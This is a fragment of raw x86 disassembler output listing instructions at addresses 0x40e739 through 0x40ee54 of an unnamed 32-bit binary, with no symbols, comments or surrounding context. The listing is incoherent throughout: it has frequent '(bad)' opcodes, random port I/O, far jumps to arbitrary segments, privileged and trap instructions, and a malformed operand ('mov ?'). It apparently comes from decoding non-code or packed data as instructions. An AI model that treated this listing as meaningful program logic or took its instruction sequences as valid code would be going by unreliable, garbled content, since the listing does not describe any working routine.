  40e739:	mov    ds:0xccb97285,al
  40e73e:	(bad)  
  40e73f:	in     al,0x4
  40e741:	sti    
  40e742:	paddsb mm4,mm7
  40e745:	das    
  40e746:	mov    esi,0xf7be5eef
  40e74b:	mov    ds:0x3d291e7f,eax
  40e750:	into   
  40e751:	pop    edi
  40e752:	pop    eax
  40e753:	in     eax,0x95
  40e755:	push   ebx
  40e756:	fwait
  40e757:	sbb    al,0x3b
  40e759:	mov    esi,0xbf1e57c2
  40e75e:	shl    BYTE PTR [ecx+0x63645f17],0xab
  40e765:	retf   0xab70
  40e768:	push   cs
  40e769:	jb     0x40e787
  40e76b:	dec    edx
  40e76c:	jecxz  0x40e7be
  40e76e:	sahf   
  40e76f:	test   DWORD PTR [eax-0x51],esp
  40e772:	push   esi
  40e773:	or     DWORD PTR [esi+0x4991b490],eax
  40e779:	or     edx,DWORD PTR [ecx-0x46ad6e8c]
  40e77f:	and    eax,0xa5892c65
  40e784:	shl    bh,0x63
  40e787:	xchg   esp,eax
  40e788:	pop    ebp
  40e789:	and    DWORD PTR [ebp+0x4b],esi
  40e78c:	sub    bl,al
  40e78e:	out    dx,al
  40e78f:	imul   edx,DWORD PTR [edx+0x7963bdd5],0x7d129c5e
  40e799:	out    0x5b,al
  40e79b:	mov    ebx,0x5b7f408c
  40e7a0:	stos   DWORD PTR es:[edi],eax
  40e7a1:	xchg   esp,eax
  40e7a2:	mov    ebx,0xfa6dde92
  40e7a7:	cli    
  40e7a8:	not    BYTE PTR [ebx+eiz*4]
  40e7ab:	ret    0xe2b8
  40e7ae:	ficomp WORD PTR [ebp-0x58cdd62b]
  40e7b4:	dec    edx
  40e7b5:	test   eax,0x9fbe3d3c
  40e7ba:	push   eax
  40e7bb:	sub    DWORD PTR [ebx+0xc],edi
  40e7be:	pop    es
  40e7bf:	fnstenv [edi+esi*8+0x4a971f6e]
  40e7c6:	and    eax,0x492eddba
  40e7cb:	xchg   edx,eax
  40e7cc:	pop    eax
  40e7cd:	push   es
  40e7ce:	mov    al,ds:0xabcc5bc7
  40e7d3:	in     al,0x1
  40e7d5:	sbb    BYTE PTR [ebx-0xa55fc8c],0x7c
  40e7dc:	lods   al,BYTE PTR ds:[esi]
  40e7dd:	mov    esi,0xcc6dd9b
  40e7e2:	inc    eax
  40e7e3:	mov    ds:0x7899380e,eax
  40e7e8:	sbb    al,0x49
  40e7ea:	xchg   ebp,eax
  40e7eb:	pavgb  mm6,QWORD PTR [ecx+0x5b]
  40e7ef:	fimul  WORD PTR [eax+0x74086452]
  40e7f5:	scas   eax,DWORD PTR es:[edi]
  40e7f6:	xchg   ebp,eax
  40e7f7:	aas    
  40e7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f9:	dec    eax
  40e7fa:	adc    eax,0x9db6d6b8
  40e7ff:	test   BYTE PTR [ebx+0x75c6d292],0x38
  40e806:	sbb    BYTE PTR [eax+0x1041edd2],ch
  40e80c:	loopne 0x40e809
  40e80e:	ds aad 0x7a
  40e811:	popf   
  40e812:	mov    DWORD PTR [ecx+0x50e1c229],ebp
  40e818:	dec    ebp
  40e819:	bnd jo 0x40e846
  40e81c:	out    dx,eax
  40e81d:	or     al,0x7
  40e81f:	add    esp,DWORD PTR [edx]
  40e821:	or     eax,0x2430a2fb
  40e826:	mov    ah,BYTE PTR [ebx+0x6]
  40e829:	cmp    ah,BYTE PTR [ebx-0x757bd84f]
  40e82f:	adc    eax,edx
  40e831:	xchg   ebx,eax
  40e832:	mov    cs,WORD PTR [edi+eiz*4-0x6cddec40]
  40e839:	or     al,0x30
  40e83b:	repz jl 0x40e827
  40e83e:	inc    esi
  40e83f:	cmc    
  40e840:	out    dx,al
  40e841:	into   
  40e842:	mov    dl,0xd9
  40e844:	bound  eax,QWORD PTR ds:[edi-0x3cf5e6c0]
  40e84b:	loope  0x40e7fd
  40e84d:	add    BYTE PTR [eax],0xb2
  40e850:	or     bl,cl
  40e852:	or     al,0xcc
  40e854:	sub    BYTE PTR [edx+0x7690c308],cl
  40e85a:	stos   DWORD PTR es:[edi],eax
  40e85b:	vpmulhw xmm6,xmm4,XMMWORD PTR [ebx-0x5ab04108]
  40e863:	push   edx
  40e864:	mov    eax,ds:0xb4b1af5e
  40e869:	jg     0x40e8aa
  40e86b:	scas   eax,DWORD PTR es:[edi]
  40e86c:	cmp    DWORD PTR [ecx*8+0x377bdf37],edi
  40e873:	pop    ds
  40e874:	std    
  40e875:	retf   
  40e876:	add    DWORD PTR [ebp+0x2b8b9f56],ebp
  40e87c:	sub    eax,0xe1dcbf8e
  40e881:	cld    
  40e882:	jns    0x40e84d
  40e884:	jmp    0x9cf3:0xb5d590e6
  40e88b:	ds das 
  40e88d:	pop    ecx
  40e88e:	fisttp WORD PTR [edx]
  40e890:	fsubr  DWORD PTR [esi+0x7]
  40e893:	ror    BYTE PTR [edi],1
  40e895:	nop
  40e896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e897:	cmp    eax,0x36328ac8
  40e89c:	or     ch,BYTE PTR [edi]
  40e89e:	and    al,0x10
  40e8a0:	add    esp,DWORD PTR [esp+ecx*4+0x2110e588]
  40e8a7:	sti    
  40e8a8:	retf   0x20c6
  40e8ab:	arpl   WORD PTR [edx+eiz*2-0x76],ax
  40e8af:	push   0x2a
  40e8b1:	fwait
  40e8b2:	xor    BYTE PTR [eax+0x2],0x93
  40e8b6:	lods   al,BYTE PTR ds:[esi]
  40e8b7:	hlt    
  40e8b8:	ja     0x40e83d
  40e8ba:	jnp    0x40e8ee
  40e8bc:	sub    ah,BYTE PTR [eax+0x48100f6b]
  40e8c2:	push   ebx
  40e8c3:	xchg   DWORD PTR [edx+0x4],esp
  40e8c6:	into   
  40e8c7:	(bad)  
  40e8c8:	test   BYTE PTR [edx+ecx*2-0x75],0xe9
  40e8cd:	jne    0x40e85b
  40e8cf:	cmp    dl,BYTE PTR [esi+0x74]
  40e8d2:	mov    esp,0x2ca863b2
  40e8d7:	(bad)
  40e8da:	pop    es
  40e8db:	test   al,0x3e
  40e8dd:	push   ebx
  40e8de:	shr    BYTE PTR [ebp-0x2c],0x3d
  40e8e2:	pop    ebp
  40e8e3:	(bad)  
  40e8e4:	in     eax,0xe6
  40e8e6:	pop    esp
  40e8e7:	push   ebp
  40e8e8:	push   edi
  40e8e9:	mov    bh,0x1e
  40e8eb:	(bad)  
  40e8ec:	mov    ebp,0x76d30021
  40e8f1:	xor    dl,0x45
  40e8f4:	int    0x30
  40e8f6:	sub    DWORD PTR [ebx+0x45],0x3eeb5e02
  40e8fd:	out    0x1a,al
  40e8ff:	add    eax,0x5618581d
  40e904:	jl     0x40e8b1
  40e906:	pop    ebx
  40e907:	test   al,0xd5
  40e909:	or     BYTE PTR [esi+0x47],0x19
  40e90d:	lds    ebp,FWORD PTR [edx-0x4b]
  40e910:	sbb    dl,BYTE PTR [ebx-0x2d]
  40e913:	rcl    esp,cl
  40e915:	jmp    0x40e98c
  40e917:	adc    cl,BYTE PTR [ebp-0x1c]
  40e91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e91b:	push   edx
  40e91c:	or     edi,ebx
  40e91e:	not    ebx
  40e920:	cli    
  40e921:	add    ebx,edx
  40e923:	xchg   esi,eax
  40e924:	xor    BYTE PTR [eax],bl
  40e926:	or     al,0xe8
  40e928:	jne    0x40e964
  40e92a:	or     bh,BYTE PTR ds:0xf50c060c
  40e930:	in     al,0x23
  40e932:	iret   
  40e933:	repz or BYTE PTR [edx+0x25],cl
  40e937:	jnp    0x40e997
  40e939:	inc    esi
  40e93a:	std    
  40e93b:	dec    ecx
  40e93c:	pop    edi
  40e93d:	xor    BYTE PTR [ebx-0x4],al
  40e940:	out    0x9d,al
  40e942:	fstp   QWORD PTR [edi+0x57]
  40e945:	jge    0x40e8d7
  40e947:	push   edx
  40e948:	dec    ebp
  40e949:	bound  ecx,QWORD PTR [edx+0x71e1a8c5]
  40e94f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e950:	out    dx,ax
  40e952:	jmp    0x40e9cd
  40e954:	jbe    0x40e9d4
  40e956:	pop    esp
  40e957:	sbb    BYTE PTR [esi+0x590e6e6c],al
  40e95d:	pop    ebx
  40e95e:	pop    ebx
  40e95f:	mov    bh,0x52
  40e961:	lods   al,BYTE PTR ds:[esi]
  40e962:	push   esp
  40e963:	sub    dl,BYTE PTR [ecx+0x2a]
  40e966:	add    eax,0xe25ca54
  40e96b:	das    
  40e96c:	push   esi
  40e96d:	jns    0x40e942
  40e96f:	add    esi,DWORD PTR [ebx]
  40e971:	xor    al,0xea
  40e973:	arpl   WORD PTR [edx+ebp*2-0x75],dx
  40e977:	dec    esp
  40e978:	dec    esi
  40e979:	iret   
  40e97a:	shr    ebx,cl
  40e97c:	cmc    
  40e97d:	cmp    DWORD PTR [esi+0x62],esi
  40e980:	fwait
  40e981:	mov    ds:0xa5f26c2f,eax
  40e986:	aas    
  40e987:	mov    ebp,0x7a274bcc
  40e98c:	lods   al,BYTE PTR ds:[esi]
  40e98d:	lods   eax,DWORD PTR ds:[esi]
  40e98e:	or     eax,0x88c777e8
  40e993:	les    edi,FWORD PTR [eax]
  40e995:	aam    0x9a
  40e997:	add    al,0xd5
  40e999:	add    eax,0xbcaaa0fc
  40e99e:	push   ds
  40e99f:	xor    al,BYTE PTR [edx-0x491dfc90]
  40e9a5:	push   edx
  40e9a6:	pop    ds
  40e9a7:	mov    ds:0xd661822e,al
  40e9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ad:	mov    al,ds:0x9f464219
  40e9b2:	(bad)  
  40e9b3:	shr    BYTE PTR [eax+0x664faa97],1
  40e9b9:	(bad)  
  40e9ba:	int    0x8b
  40e9bc:	and    BYTE PTR [eax-0x2d],dl
  40e9bf:	test   BYTE PTR [ebp+0x67],cl
  40e9c2:	cmp    cl,BYTE PTR [ecx+eax*2-0x1c]
  40e9c6:	stc    
  40e9c7:	out    0xd,al
  40e9c9:	hlt    
  40e9ca:	xchg   ebx,eax
  40e9cb:	mov    dh,0x45
  40e9cd:	test   BYTE PTR [ecx],dl
  40e9cf:	int3   
  40e9d0:	out    dx,al
  40e9d1:	test   eax,0x3526fbe2
  40e9d6:	pop    esp
  40e9d7:	push   esi
  40e9d8:	mov    eax,0x24d163b8
  40e9dd:	add    cl,cl
  40e9df:	(bad)  
  40e9e0:	iret   
  40e9e1:	or     eax,eax
  40e9e3:	xchg   ebp,eax
  40e9e4:	jmp    0x40e9c5
  40e9e6:	lock (bad) 
  40e9e8:	mov    ah,0x9b
  40e9ea:	retf   0xa408
  40e9ed:	pop    edx
  40e9ee:	ficomp WORD PTR [eax-0x4a2ec599]
  40e9f4:	repnz stos DWORD PTR es:[edi],eax
  40e9f6:	cmc    
  40e9f7:	cmp    al,0x7a
  40e9f9:	push   eax
  40e9fa:	(bad)  
  40e9fb:	pop    edi
  40e9fc:	fist   DWORD PTR [ebx]
  40e9fe:	mov    al,0x13
  40ea00:	pushf  
  40ea01:	das    
  40ea02:	xor    cl,BYTE PTR [esi+eiz*8]
  40ea05:	out    0x3,eax
  40ea07:	mov    eax,0xe42188ad
  40ea0c:	out    dx,eax
  40ea0d:	jns    0x40e9bc
  40ea0f:	std    
  40ea10:	xlat   BYTE PTR ds:[ebx]
  40ea11:	repnz cmp cl,BYTE PTR [eax+0x29]
  40ea15:	adc    eax,0x514d4fe1
  40ea1a:	xlat   BYTE PTR ds:[ebx]
  40ea1b:	xchg   BYTE PTR [ebx+eax*2-0x4],al
  40ea1f:	inc    edx
  40ea20:	or     dl,bl
  40ea22:	in     eax,dx
  40ea23:	lods   eax,DWORD PTR ss:[esi]
  40ea25:	push   esi
  40ea26:	mov    ebx,DWORD PTR [esi-0x51]
  40ea29:	inc    edi
  40ea2a:	test   eax,0x68d9a65c
  40ea2f:	push   eax
  40ea30:	stos   DWORD PTR es:[edi],eax
  40ea31:	aad    0x18
  40ea33:	stos   DWORD PTR es:[edi],eax
  40ea34:	push   esi
  40ea35:	cmp    ecx,DWORD PTR [ebx+0x6aa58b8b]
  40ea3b:	lods   eax,DWORD PTR ds:[esi]
  40ea3c:	push   esi
  40ea3d:	out    dx,al
  40ea3e:	idiv   DWORD PTR [edx+0x6c]
  40ea41:	outs   dx,DWORD PTR ds:[esi]
  40ea42:	outs   dx,DWORD PTR ds:[esi]
  40ea43:	mov    bl,0xbd
  40ea45:	mov    ch,0x45
  40ea47:	mov    bh,0xdb
  40ea49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4a:	fucomip st,st(3)
  40ea4c:	shr    edi,1
  40ea4e:	imul   DWORD PTR [ebp-0x7efbeb76]
  40ea54:	sub    eax,0x374191e2
  40ea59:	outs   dx,BYTE PTR ds:[esi]
  40ea5a:	lahf   
  40ea5b:	adc    al,0xf4
  40ea5d:	pop    edi
  40ea5e:	sahf   
  40ea5f:	leave  
  40ea60:	jp     0x40eaa4
  40ea62:	adc    bh,ch
  40ea64:	sub    cl,0xe6
  40ea67:	fwait
  40ea68:	imul   eax,DWORD PTR [esi+esi*1],0x2d
  40ea6c:	dec    ecx
  40ea6d:	adc    al,BYTE PTR [esi]
  40ea6f:	and    DWORD PTR [ecx],0xffffff83
  40ea72:	rcl    DWORD PTR [eax-0x18c91253],0xcf
  40ea79:	lods   eax,DWORD PTR ds:[esi]
  40ea7a:	and    BYTE PTR [ecx+0x79],dl
  40ea7d:	out    dx,eax
  40ea7e:	jmp    0x2c13:0x13e31af5
  40ea85:	cs into 
  40ea87:	repz cmp eax,0xef9a697f
  40ea8d:	sti    
  40ea8e:	enter  0xca21,0xa5
  40ea92:	es retf 
  40ea94:	pop    ss
  40ea95:	(bad)  
  40ea96:	stc    
  40ea97:	fcmovbe st,st(3)
  40ea99:	fwait
  40ea9a:	mov    esp,0x4f0aec70
  40ea9f:	sbb    eax,0xc9cce75b
  40eaa4:	xchg   ebx,eax
  40eaa5:	lods   al,BYTE PTR ds:[esi]
  40eaa6:	ins    DWORD PTR es:[edi],dx
  40eaa7:	ss pusha 
  40eaa9:	pop    eax
  40eaaa:	xchg   dl,dh
  40eaac:	sbb    BYTE PTR [esi+0x63],bl
  40eaaf:	divps  xmm7,XMMWORD PTR [ecx-0x3a]
  40eab3:	mov    ?,WORD PTR ds:0xc396e2f
  40eab9:	mov    eax,ds:0x4a4d6765
  40eabe:	adc    eax,edx
  40eac0:	ins    BYTE PTR es:[edi],dx
  40eac1:	cdq    
  40eac2:	inc    eax
  40eac3:	rol    BYTE PTR cs:[edi-0x68],0x6d
  40eac8:	jmp    0xf3ec4a81
  40eacd:	imul   esp,DWORD PTR [esi-0x60],0x7b
  40ead1:	or     ah,BYTE PTR [ecx+esi*4-0x5c]
  40ead5:	mov    bh,0x3c
  40ead7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead8:	test   al,0x25
  40eada:	retf   0x1b68
  40eadd:	(bad)  
  40eade:	xor    ebp,edx
  40eae0:	mov    al,BYTE PTR [eax+0x26]
  40eae3:	sub    esp,edi
  40eae5:	das    
  40eae6:	inc    edx
  40eae7:	mov    ds:0xedd09249,al
  40eaec:	jbe    0x40ea79
  40eaee:	bound  eax,QWORD PTR [eax]
  40eaf0:	mov    eax,cs:0x955f0122
  40eaf6:	mov    dh,0x1b
  40eaf8:	add    al,0xa0
  40eafa:	sti    
  40eafb:	dec    eax
  40eafc:	jmp    0x4e21755a
  40eb01:	or     BYTE PTR [ebx],0xd5
  40eb04:	xchg   esp,eax
  40eb05:	pop    ebx
  40eb06:	les    ecx,FWORD PTR [ebp-0x6]
  40eb09:	cdq    
  40eb0a:	mov    ebx,0x8a952380
  40eb0f:	mov    dh,0x5f
  40eb11:	mov    esp,DWORD PTR [ecx]
  40eb13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb14:	mul    DWORD PTR [esi+0x47]
  40eb17:	or     ah,0xa3
  40eb1a:	and    DWORD PTR [edx],0xffffff86
  40eb1d:	xchg   ebx,eax
  40eb1e:	mov    edi,0xa2bd7b96
  40eb23:	xchg   esi,eax
  40eb24:	push   edi
  40eb25:	inc    ebp
  40eb26:	or     al,0x61
  40eb28:	xchg   esi,eax
  40eb29:	dec    edx
  40eb2a:	and    eax,0x99272726
  40eb2f:	cwde   
  40eb30:	cwde   
  40eb31:	mov    al,0xc8
  40eb33:	(bad)  
  40eb34:	mov    ah,0x38
  40eb36:	mov    gs,WORD PTR [ecx-0x49]
  40eb39:	fld    TBYTE PTR [esi+ebp*2+0x6e]
  40eb3d:	adc    al,bh
  40eb3f:	xor    ebp,esp
  40eb41:	jb     0x40eadc
  40eb43:	dec    edx
  40eb44:	mov    ecx,0xa43870cc
  40eb49:	xlat   BYTE PTR ds:[ebx]
  40eb4a:	jmp    0x40eb3d
  40eb4c:	fwait
  40eb4d:	mov    edi,0x7dbf9bf9
  40eb52:	jmp    0xc0209129
  40eb57:	out    dx,eax
  40eb58:	mov    esi,0xdaf8defb
  40eb5d:	xlat   BYTE PTR ds:[ebx]
  40eb5e:	mov    esi,0xef7bcef6
  40eb63:	mov    ebp,0x87fdbef7
  40eb68:	push   cs
  40eb69:	sbb    eax,0x2640ca40
  40eb6e:	dec    ecx
  40eb6f:	adc    BYTE PTR [ebp+0x11],al
  40eb72:	in     eax,dx
  40eb73:	push   esi
  40eb74:	mov    ebp,DWORD PTR [ebp-0x2425d253]
  40eb7a:	fcomi  st,st(4)
  40eb7c:	je     0x40eb6c
  40eb7e:	add    cl,bh
  40eb80:	rep ins BYTE PTR es:[edi],dx
  40eb82:	or     al,0x43
  40eb84:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40eb86:	pushf  
  40eb87:	sti    
  40eb88:	push   cs
  40eb89:	add    eax,0xfa5022ef
  40eb8e:	mov    al,0x4c
  40eb90:	xchg   edx,eax
  40eb91:	sbb    eax,0xb4cdf3c7
  40eb96:	jl     0x40ec17
  40eb98:	mov    edx,0xa74e9d36
  40eb9d:	inc    edi
  40eb9e:	mov    ebx,0xd9dce5dd
  40eba3:	repz js 0x40ebe8
  40eba6:	push   eax
  40eba7:	stos   DWORD PTR es:[edi],eax
  40eba8:	push   ebp
  40eba9:	test   eax,0xd9ecea37
  40ebae:	xor    ecx,ebp
  40ebb0:	mov    ebx,0xf807cdf
  40ebb5:	mov    esi,0xd2fc1ef7
  40ebba:	and    al,0xad
  40ebbc:	not    BYTE PTR [eax-0x1e26c0d1]
  40ebc2:	in     al,dx
  40ebc3:	test   eax,0xd89d8e55
  40ebc8:	loop   0x40eb7b
  40ebca:	daa    
  40ebcb:	dec    esi
  40ebcc:	rcr    dl,1
  40ebce:	mov    ds,WORD PTR [eax]
  40ebd0:	les    esi,FWORD PTR [ebp-0x7a]
  40ebd3:	dec    ecx
  40ebd4:	or     eax,0x37804d19
  40ebd9:	or     eax,0x9afc7995
  40ebde:	xchg   edi,eax
  40ebe0:	add    BYTE PTR [edi+0x445dc43e],cl
  40ebe6:	mov    esp,0x548318a5
  40ebeb:	imul   ebx,edx,0xf79a1114
  40ebf1:	push   edi
  40ebf2:	push   0xe2b4da40
  40ebf7:	out    dx,al
  40ebf8:	fwait
  40ebf9:	mov    ebp,DWORD PTR [ebp+edi*2+0x49a0ac80]
  40ec00:	push   ebp
  40ec01:	add    dl,dl
  40ec03:	or     al,cl
  40ec05:	mov    ecx,0x1528938e
  40ec0a:	add    BYTE PTR [ecx],ch
  40ec0c:	or     esp,edi
  40ec0e:	test   BYTE PTR [esi+0x3f],bh
  40ec11:	cmp    edx,DWORD PTR [ebp+0x4d1e3f3f]
  40ec17:	adc    al,0x60
  40ec19:	adc    DWORD PTR [eax-0x702e00c6],0x39e6f47e
  40ec23:	repz xlat BYTE PTR ds:[ebx]
  40ec25:	fnstenv [esi-0x7d]
  40ec28:	add    dl,bh
  40ec2a:	sahf   
  40ec2b:	out    0xd9,eax
  40ec2d:	stos   BYTE PTR es:[edi],al
  40ec2e:	xor    DWORD PTR [esi-0x2e],eax
  40ec31:	sbb    ecx,DWORD PTR [ecx]
  40ec33:	scas   eax,DWORD PTR es:[edi]
  40ec34:	or     BYTE PTR [ebx],bh
  40ec36:	test   edi,esi
  40ec38:	push   0x40
  40ec3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec3b:	(bad)  
  40ec3c:	xor    eax,0x420953cf
  40ec41:	lea    edi,[ebx]
  40ec43:	int    0x6d
  40ec45:	inc    ebp
  40ec46:	inc    esi
  40ec47:	shl    BYTE PTR [edx+0x6ffba376],0xc8
  40ec4e:	adc    eax,0xf97d8d78
  40ec53:	data16 or BYTE PTR [edi+0x33312a54],bh
  40ec5a:	xor    eax,ebx
  40ec5c:	clc    
  40ec5d:	clc    
  40ec5e:	cmp    ch,ah
  40ec60:	jb     0x40ec9b
  40ec62:	xchg   ebx,eax
  40ec63:	fadd   QWORD PTR [eax+eiz*2]
  40ec66:	jnp    0x40ece3
  40ec68:	fwait
  40ec69:	lods   eax,DWORD PTR ds:[esi]
  40ec6a:	lods   eax,DWORD PTR ds:[esi]
  40ec6b:	sub    eax,0x7c77855b
  40ec70:	jl     0x40ec0e
  40ec72:	push   0xffffffb5
  40ec74:	dec    edx
  40ec75:	adc    BYTE PTR [esi+esi*8],al
  40ec78:	push   ds
  40ec79:	pop    edx
  40ec7a:	adc    ch,BYTE PTR [edi+edi*1-0xa]
  40ec7e:	fsub   DWORD PTR [ebx-0x39]
  40ec81:	pop    ds
  40ec82:	jnp    0x40ec70
  40ec84:	mov    cl,0x53
  40ec86:	adc    BYTE PTR [edi-0x55],0xd5
  40ec8a:	call   0xa6a6:0x7b8b8b8b
  40ec91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec92:	es daa 
  40ec94:	es neg BYTE PTR es:[eax+edi*1]
  40ec99:	jo     0x40ecfb
  40ec9b:	outs   dx,BYTE PTR ds:[esi]
  40ec9c:	call   edx
  40ec9e:	shl    dl,cl
  40eca0:	add    edi,DWORD PTR [edi-0x12]
  40eca3:	iret   
  40eca4:	mov    ebp,0x8585cee6
  40eca9:	or     ebp,0x66
  40ecac:	jae    0x40ecd0
  40ecae:	push   cs
  40ecaf:	inc    ebx
  40ecb0:	ss aaa 
  40ecb2:	aaa    
  40ecb3:	fstp   DWORD PTR [eax+0x5f]
  40ecb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecb7:	mov    ds:0x8e388755,eax
  40ecbc:	sub    eax,0x96dafb71
  40ecc1:	pusha  
  40ecc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc3:	pop    eax
  40ecc4:	scas   al,BYTE PTR es:[edi]
  40ecc5:	(bad)  
  40ecc6:	std    
  40ecc7:	and    BYTE PTR [eax-0x4f],dl
  40ecca:	push   cs
  40eccb:	mov    bh,0xa1
  40eccd:	in     eax,0xed
  40eccf:	or     al,BYTE PTR [edx]
  40ecd1:	or     bl,al
  40ecd3:	mov    BYTE PTR [ebp-0x2829d273],cl
  40ecd9:	aaa    
  40ecda:	cmp    ecx,esi
  40ecdc:	retf   0x4a29
  40ecdf:	in     eax,0x32
  40ece1:	mov    ch,0x7a
  40ece3:	xchg   ebp,eax
  40ece4:	mov    cl,0xb1
  40ece6:	xor    esi,ebp
  40ece8:	sahf   
  40ece9:	fwait
  40ecea:	in     al,0xc1
  40ecec:	mov    ebx,0xfbe77c1b
  40ecf1:	pop    ss
  40ecf2:	adc    BYTE PTR [ecx+ebx*1],dh
  40ecf5:	les    esp,FWORD PTR [ebp-0x2a]
  40ecf8:	aaa    
  40ecf9:	add    esi,DWORD PTR [esi-0x416344c9]
  40ecff:	nop
  40ed00:	jo     0x40ed77
  40ed02:	jne    0x40ec8f
  40ed04:	scas   eax,DWORD PTR es:[edi]
  40ed05:	push   ds
  40ed06:	sbb    eax,0x36f9ec72
  40ed0b:	fld    TBYTE PTR [ebp-0xf9a05fc]
  40ed11:	jge    0x40ecbb
  40ed13:	das    
  40ed14:	loop   0x40ed6b
  40ed16:	sbb    edi,DWORD PTR [edx]
  40ed18:	cld    
  40ed19:	and    BYTE PTR [ecx],al
  40ed1b:	sbb    DWORD PTR [ecx],esp
  40ed1d:	loop   0x40ed20
  40ed1f:	and    al,0x2d
  40ed21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed22:	dec    edx
  40ed23:	cwde   
  40ed24:	and    BYTE PTR [esi],ah
  40ed26:	sbb    eax,0x988362b7
  40ed2b:	test   BYTE PTR [eax+0x46],al
  40ed2e:	or     DWORD PTR [ecx],ebx
  40ed30:	mul    DWORD PTR [edx]
  40ed32:	inc    esi
  40ed33:	xor    ecx,eax
  40ed35:	xor    DWORD PTR [ecx],eax
  40ed37:	sbb    al,0xc1
  40ed39:	xchg   ebx,eax
  40ed3a:	outs   dx,BYTE PTR ds:[esi]
  40ed3b:	dec    ecx
  40ed3c:	cdq    
  40ed3d:	outs   dx,BYTE PTR ds:[esi]
  40ed3e:	lods   al,BYTE PTR ds:[esi]
  40ed3f:	ret    0x380
  40ed42:	dec    edi
  40ed43:	xor    cl,al
  40ed45:	push   0x0
  40ed47:	jbe    0x40ed65
  40ed49:	xchg   esi,eax
  40ed4a:	retf   
  40ed4b:	stos   BYTE PTR es:[edi],al
  40ed4c:	les    ebx,FWORD PTR [esi+edi*4+0x36]
  40ed50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed51:	outs   dx,BYTE PTR ds:[esi]
  40ed52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed53:	mov    esi,0x7afebe9e
  40ed58:	fld    TBYTE PTR [esi+0x10]
  40ed5b:	inc    eax
  40ed5c:	pop    edi
  40ed5d:	or     BYTE PTR [ecx-0x49],al
  40ed60:	fist   DWORD PTR [ecx-0x3f]
  40ed63:	das    
  40ed64:	xor    ch,BYTE PTR ds:0x749aa563
  40ed6a:	cwde   
  40ed6b:	sbb    BYTE PTR [ecx+0x4f],0x89
  40ed6f:	ret    
  40ed70:	or     al,0x8a
  40ed72:	imul   esp,DWORD PTR [esp+eax*2],0xffffffb8
  40ed76:	test   eax,0xd7b4e796
  40ed7b:	xor    ch,dl
  40ed7d:	pop    ebp
  40ed7e:	psubd  mm2,QWORD PTR [edi]
  40ed81:	xor    DWORD PTR [ecx+0x54a98e38],eax
  40ed87:	sub    cl,ah
  40ed89:	int    0xcd
  40ed8b:	xor    DWORD PTR ds:0xf7676d3d,edi
  40ed91:	mov    ecx,0x5b5bcd61
  40ed96:	pop    ebx
  40ed97:	lods   al,BYTE PTR ds:[esi]
  40ed98:	scas   eax,DWORD PTR es:[edi]
  40ed99:	scas   eax,DWORD PTR es:[edi]
  40ed9a:	rcl    ebp,cl
  40ed9c:	mov    bl,0xff
  40ed9e:	es daa 
  40eda0:	daa    
  40eda1:	imul   esi,DWORD PTR [esi],0x841969b
  40eda7:	and    DWORD PTR [eax],ecx
  40eda9:	ret    
  40edaa:	nop
  40edab:	retf   
  40edac:	xchg   edi,eax
  40edad:	das    
  40edae:	xor    ebx,DWORD PTR [eax]
  40edb0:	or     al,0x90
  40edb2:	push   edx
  40edb3:	not    BYTE PTR [ecx-0x27]
  40edb6:	xor    eax,0xf5ec801a
  40edbb:	jp     0x40edae
  40edbd:	leave  
  40edbe:	xchg   ebx,eax
  40edbf:	daa    
  40edc0:	das    
  40edc1:	mov    ds:0xe8c7434a,al
  40edc6:	int3   
  40edc7:	adc    al,0xd5
  40edc9:	push   0xffffffb5
  40edcb:	xor    DWORD PTR [edi],esi
  40edcd:	aaa    
  40edce:	aaa    
  40edcf:	stc    
  40edd0:	xchg   esi,eax
  40edd1:	mov    bh,0xbc
  40edd3:	in     eax,0x75
  40edd5:	pop    es
  40edd6:	push   cs
  40edd7:	push   ds
  40edd8:	cmp    al,0xfc
  40edda:	rol    BYTE PTR [ebx-0xf8621f1],1
  40ede0:	lock loope 0x40edde
  40ede3:	sbb    esi,ebp
  40ede5:	cli    
  40ede6:	inc    esp
  40ede7:	sbb    BYTE PTR [ebp-0x54],al
  40edea:	scas   eax,DWORD PTR es:[edi]
  40edeb:	scas   al,BYTE PTR es:[edi]
  40edec:	mov    dl,0xb2
  40edee:	mov    dl,0x42
  40edf0:	mov    bh,0xdd
  40edf2:	push   esi
  40edf3:	icebp  
  40edf4:	or     cl,BYTE PTR [ecx+0x42]
  40edf7:	mov    al,ds:0xd90d8251
  40edfc:	(bad)  
  40edfd:	or     ch,BYTE PTR [esi+0xc3bc061]
  40ee03:	ret    0xde5b
  40ee06:	mov    WORD PTR [ecx+0x74dcf5d3],es
  40ee0c:	cmp    edi,DWORD PTR ds:0x573edd7a
  40ee12:	scas   eax,DWORD PTR es:[edi]
  40ee13:	lods   al,BYTE PTR ds:[esi]
  40ee14:	and    al,BYTE PTR [eax+eiz*1+0x1bd40528]
  40ee1b:	xor    eax,0x98262726
  40ee20:	call   0xf0ce:0xd7cee09a
  40ee27:	pop    ss
  40ee28:	mov    edi,0xe37a816d
  40ee2d:	and    ch,bl
  40ee2f:	or     edi,0xc78f7ada
  40ee35:	pop    esi
  40ee36:	call   0x6df2e12e
  40ee3b:	sahf   
  40ee3c:	cmp    DWORD PTR [edx-0x72],edi
  40ee3f:	inc    edi
  40ee40:	mov    esi,0xd6ee9972
  40ee45:	sbb    bh,BYTE PTR [ebp+0x75c424de]
  40ee4b:	test   al,0x8f
  40ee4d:	inc    ecx
  40ee4e:	jne    0x40ee52
  40ee50:	scas   eax,DWORD PTR es:[edi]
  40ee51:	mov    dl,0xf
  40ee53:	scas   eax,DWORD PTR es:[edi]
  40ee54:	out    dx,al
